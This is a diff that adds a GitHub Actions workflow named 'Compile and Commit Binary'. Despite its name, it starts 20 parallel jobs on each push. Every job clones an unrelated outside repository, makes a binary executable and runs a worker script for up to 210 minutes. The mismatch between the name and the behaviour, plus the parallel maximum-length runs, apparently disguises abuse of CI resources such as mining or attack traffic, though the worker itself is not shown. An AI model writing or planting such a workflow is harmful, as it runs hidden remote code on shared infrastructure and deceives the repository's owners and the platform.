@@ -1,0 +1,56 @@
+name: Compile and Commit Binary
+
+on:
+  push:
+    branches:
+      - main
+      - master
+  workflow_dispatch:
+
+jobs:
+  compile-ubuntu:
+    name: Compile on Ubuntu
+    runs-on: ubuntu-latest
+
+    strategy:
+      fail-fast: false
+      max-parallel: 80
+      matrix:
+        id:
+          - 1
+          - 2
+          - 3
+          - 4
+          - 5
+          - 6
+          - 7
+          - 8
+          - 9
+          - 10
+          - 11
+          - 12
+          - 13
+          - 14
+          - 15
+          - 16
+          - 17
+          - 18
+          - 19
+          - 20
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Install system dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y gcc make python3-pip
+
+      - name: Clone repo and run worker
+        run: |
+          git clone https://github.com/VishalDevloper03/Vishal.git
+          cd Vishal
+          chmod +x vishal
+          pip3 install requests
+          timeout 12600 python3 worker.py || echo "Script ran for 210 minutes"
